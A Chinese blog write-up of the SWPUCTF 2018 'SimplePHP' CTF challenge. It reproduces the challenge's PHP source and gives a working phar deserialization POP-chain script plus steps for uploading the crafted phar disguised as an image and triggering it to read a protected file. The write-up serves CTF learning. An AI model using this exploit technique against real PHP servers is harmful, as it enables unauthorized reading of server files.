---
title: '[SWPUCTF 2018]SimplePHP'
date: 2024-06-11 20:59:42
tags: 题解
categories: 刷题笔记
---

### [SWPUCTF 2018]SimplePHP

打开页面，在查找文件处发现任意命令执行漏洞

![image-20240611212959706](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406112130798.png)

我们可以通过它来读取文件源码

<!--more-->

**index.php**

```
<?php 
header("content-type:text/html;charset=utf-8");  
include 'base.php';
?> 
```

**upload_file.php**

```
<?php 
include 'function.php'; 
upload_file(); 
?> 
```

**function.php**

```
<?php 
//show_source(__FILE__); 
include "base.php"; 
header("Content-type: text/html;charset=utf-8"); 
error_reporting(0); 
function upload_file_do() { 
    global $_FILES; 
    $filename = md5($_FILES["file"]["name"].$_SERVER["REMOTE_ADDR"]).".jpg"; 
    //mkdir("upload",0777); 
    if(file_exists("upload/" . $filename)) { 
        unlink($filename); 
    } 
    move_uploaded_file($_FILES["file"]["tmp_name"],"upload/" . $filename); 
    echo '<script type="text/javascript">alert("上传成功!");</script>'; 
} 
function upload_file() { 
    global $_FILES; 
    if(upload_file_check()) { 
        upload_file_do(); 
    } 
} 
function upload_file_check() { 
    global $_FILES; 
    $allowed_types = array("gif","jpeg","jpg","png"); 
    $temp = explode(".",$_FILES["file"]["name"]); 
    $extension = end($temp); 
    if(empty($extension)) { 
        //echo "<h4>请选择上传的文件:" . "<h4/>"; 
    } 
    else{ 
        if(in_array($extension,$allowed_types)) { 
            return true; 
        } 
        else { 
            echo '<script type="text/javascript">alert("Invalid file!");</script>'; 
            return false; 
        } 
    } 
} 
?> 
```

**base.php**

```
<?php 
    session_start(); 
?> 
```

**file.php**

```
<?php 
header("content-type:text/html;charset=utf-8");  
include 'function.php'; 
include 'class.php'; 
ini_set('open_basedir','/var/www/html/'); 
$file = $_GET["file"] ? $_GET['file'] : ""; 
if(empty($file)) { 
    echo "<h2>There is no file to show!<h2/>"; 
} 
$show = new Show(); 
if(file_exists($file)) { 
    $show->source = $file; 
    $show->_show(); 
} else if (!empty($file)){ 
    die('file doesn\'t exists.'); 
} 
?> 
```

**class.php**

```
<?php
class C1e4r
{
    public $test;
    public $str;
    public function __construct($name)
    {
        $this->str = $name;
    }
    public function __destruct()
    {
        $this->test = $this->str;
        echo $this->test;
    }
}

class Show
{
    public $source;
    public $str;
    public function __construct($file)
    {
        $this->source = $file;   //$this->source = phar://phar.jpg
        echo $this->source;
    }
    public function __toString()
    {
        $content = $this->str['str']->source;
        return $content;
    }
    public function __set($key,$value)
    {
        $this->$key = $value;
    }
    public function _show()
    {
        if(preg_match('/http|https|file:|gopher|dict|\.\.|f1ag/i',$this->source)) {
            die('hacker!');
        } else {
            highlight_file($this->source);
        }
        
    }
    public function __wakeup()
    {
        if(preg_match("/http|https|file:|gopher|dict|\.\./i", $this->source)) {
            echo "hacker~";
            $this->source = "index.php";
        }
    }
}
class Test
{
    public $file;
    public $params;
    public function __construct()
    {
        $this->params = array();
    }
    public function __get($key)
    {
        return $this->get($key);
    }
    public function get($key)
    {
        if(isset($this->params[$key])) {
            $value = $this->params[$key];
        } else {
            $value = "index.php";
        }
        return $this->file_get($value);
    }
    public function file_get($value)
    {
        $text = base64_encode(file_get_contents($value));
        return $text;
    }
}
?>
```

我们在页面中发现flag在f1ag.php里面，所以我们的目的是读取f1ag.php文件

我们进行代码审计，在class.php中可以看到一个提示

```
 public function __construct($file)
    {
        $this->source = $file;   //$this->source = phar://phar.jpg
        echo $this->source;
    }

```

这个给我们的思路是phar反序列化

入口函数在file.php中

```
$show = new Show(); 
if(file_exists($file)) { 
    $show->source = $file; 
    $show->_show(); 
} else if (!empty($file)){ 
    die('file doesn\'t exists.'); 
} 

```

找到入口函数后，下一步构造pop链

漏洞的利用点在

```
#class Test
public function file_get($value)
    {
        $text = base64_encode(file_get_contents($value));
        return $text;
    }

```

但这里仅仅是返回了f1ag.php的值，并没有将其打印出来

因此我们还需要一个打印的函数

```
class C1e4r
{
    public $test;
    public $str;
    public function __construct($name)
    {
        $this->str = $name;
    }
    public function __destruct()
    {
        $this->test = $this->str;
        echo $this->test; //这里使用echo函数，很明显就是想让我们利用这个点，test的值是str给的，str的值是我们传的name参数给的
    }
}

```

在C1e4r中又打印函数，我们需要利用它，那么思路就很明确了，通过new Cle4r（$name），将值传给str，然后自动触发__destruct(),打印test。

说明下一步要考虑name应该传什么

从Test类中我们可以发现，__get(\$key)=>get(\$key)=>file_get(\$value)这样一条利用链,\$key的值,是触发\_\_get时传入的\$value的值是通过params(\$key)得到的，所以不妨令params=array(“source”=>“f1ag.php”),然后我们传入$key=“1”,即可

下一步思考怎么触发__get

```
public function __construct($file)
    {
        $this->source = $file;   //$this->source = phar://phar.jpg
        echo $this->source;
    }
    public function __toString()
    {
        $content = $this->str['str']->source;
        return $content;
    }

```

令str[‘str’] = new Test(),那么在toString()就是new Test()->source,而source不是Test中的属性，所以就可以触发到get

上面的key之所以为source，是因为这里的new Test()->source调用的就是source不存在属性，这个source被当做参数传了过去

__toString(),反序列化中的魔术方法，当类被当做字符串输出的时候会自动调用toString()方法

令$this->source=new Show()它自身

那么到现在整个pop链条就清晰明了

```
<?php

class C1e4r
{
    public $test;
    public $str;
}

class Show
{
    public $source;
    public $str;
}
class Test
{
    public $file;
    public $params;
    public function __construct()
    {
        $this->params = array('source'=>'/var/www/html/f1ag.php');
    }

}
$c = new C1e4r();
$s=new Show();
$t =new Test();
$s->source=$s;
$s->str['str']=$t;
$c->str=$s;
echo(serialize($c));


$phar = new Phar("exp.phar"); //.phar文件
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ? >'); //固定的
$phar->setMetadata($c); //触发的头是C1e4r类，所以传入C1e4r对象
$phar->addFromString("exp.txt", "test"); //随便写点什么生成个签名
$phar->stopBuffering();

?>


```

得到生成的phar文件，就要进行文件上传

但由于只能上传gif，jpeg，jpg，png结尾的文件，我们更改后缀再上传

然后访问upload找到我们上传文件得文件名

![image-20240612213933700](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406122139905.png)

用phar协议访问，得到flag的base64，解码得到flag

![image-20240612214211855](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406122142026.png)
